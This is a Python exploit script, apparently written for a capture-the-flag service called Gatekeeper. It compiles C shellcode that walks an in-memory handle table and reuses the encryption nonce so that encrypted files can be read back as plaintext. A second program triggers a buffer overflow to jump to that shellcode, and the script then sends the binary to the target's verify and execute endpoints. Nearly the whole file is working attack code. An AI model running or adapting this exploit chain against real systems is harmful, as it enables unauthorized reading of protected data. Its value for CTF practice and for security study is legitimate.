#!/usr/bin/env python3

from __future__ import annotations

import os
import shutil
import sys
import base64
import asyncio
import aiohttp
import tempfile
import argparse
from pathlib import Path

CHECKER_ROOT = Path(__file__).resolve().parents[1] / "checker"
MAKE_DIR = Path(__file__).resolve().parents[1] / "service" / "example_program"
print(CHECKER_ROOT)
if str(CHECKER_ROOT) not in sys.path:
    sys.path.insert(0, str(CHECKER_ROOT))

from proggen.compile import CompileError, make_compile  # type: ignore[import]
from service_client import GatekeeperClient  # type: ignore[import]


def bytes_to_c_arr(data, lowercase=True):
    s = [format(b, "#04x" if lowercase else "#04X") for b in data]
    return "const uint8_t shellcode[] = {{{}}}".format(", ".join(s)) + ";"


def generate_shellcode():
    shellcode_src = r"""
#include "ministd.h"
#include "trusted_lib_api.h"
#include <stdint.h>

#define MAX_FILE_SIZE 2048 + 12
#define HANDLES_MAX_ENTRIES ((0x80000 - sizeof(uint32_t)) / sizeof(HandleEntry_t))

// @TODO: add attack data handling

typedef struct __attribute__((packed))
{
    uint64_t public_handle;
    uint64_t private_handle;
    uint32_t encrypted;
} HandleEntry_t;

typedef struct
{
    uint32_t total_entries;
    HandleEntry_t entries[HANDLES_MAX_ENTRIES];
} HandleTable_t;

void vzlom() {
    volatile HandleTable_t *tbl = (volatile HandleTable_t *)0x13400000;
    uint8_t file_buffer[MAX_FILE_SIZE];
    uint8_t buffer2[MAX_FILE_SIZE];
    uint8_t iv[12] = {0};
    uint8_t tag[16] = {0};

    uint32_t total_entries = tbl->total_entries;
    for (uint32_t i = 0; i < total_entries; ++i) {
        if (tbl->entries[i].encrypted) {
            uint32_t len = sizeof(file_buffer);
            uint32_t len2 = sizeof(buffer2);

            read_file_plain(tbl->entries[i].public_handle, file_buffer, &len);
            memcpy(iv, file_buffer, 12);
            uint64_t new_handle = create_file_enc(buffer2, len2 - 12, (uint32_t *)iv, (uint32_t *)tag);
            read_file_plain(new_handle, buffer2, &len2);

            for (uint32_t i = 0; i < len - 12; ++i) {
                mini_printf("%c", buffer2[12 + i] ^ file_buffer[12 + i]);
            }
            // memset(file_buffer, 0, sizeof(file_buffer));
            // memset(buffer2, 0, sizeof(buffer2));
            // memset(iv, 0, sizeof(iv));
        }
    }
}

ENTRY_POINT_ATTR void start()
{
    vzlom();
    ENTRY_POINT_END();
}"""

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_path = Path(tmpdir)
        src_path = tmp_path / "exploit-type-confusion-shellcode.c"
        src_path.write_text(shellcode_src)

        out_dir = tmp_path / "out"

        try:
            shellcode_path = make_compile(
                MAKE_DIR,
                src_path,
                out_dir,
                extra_cflags="-Os -fPIC",
                target="prog",
                comptime_seed=1,
            )
        except CompileError as exc:
            print(f"failed to compile exploit-type-confusion-shellcode.c: {exc}")
            return None

        shellcode = bytes_to_c_arr(shellcode_path.read_bytes())
        print(shellcode_path)

    return shellcode


def main():
    parser = argparse.ArgumentParser(description="Exploit type confusion")
    parser.add_argument(
        "--host",
        type=str,
        default="localhost",
        help="Target host to exploit",
    )
    args = parser.parse_args()

    exp_src = r"""
#include "ministd.h"
#include "trusted_lib_api.h"
#include <stdint.h>

<SHELLCODE_DEF>

ENTRY_POINT_ATTR void start()
{
    // Triggers BOF, and jumps to our pre-inited data.
    memcpy((void *)0x313130, shellcode, sizeof(shellcode));
    TRUSTED_CALL_VOID(mini_printf, "%b\n", 0b110ull << 56ull);
    ENTRY_POINT_END();
}
    """.replace(
        "<SHELLCODE_DEF>", generate_shellcode()
    )

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_path = Path(tmpdir)
        src_path = tmp_path / "exploit-type-confusion.c"
        src_path.write_text(exp_src)

        out_dir = tmp_path / "out"

        try:
            bin_path = make_compile(
                MAKE_DIR,
                src_path,
                out_dir,
                extra_cflags="-O3",
                target="prog",
                comptime_seed=1,
            )
        except CompileError as exc:
            print(f"failed to compile exploit-type-confusion.c: {exc}")
            return

        program_b64 = base64.b64encode(bin_path.read_bytes()).decode()

    client = GatekeeperClient(args.host)
    verify_result = client.verify_program_sync(
        {"program": program_b64},
    )
    print("Verify result:", verify_result)

    execute_result = client.execute_program_sync(
        {"signature": verify_result["signature"], "program": program_b64}
    )
    print("Execution result:", execute_result)


if __name__ == "__main__":
    main()
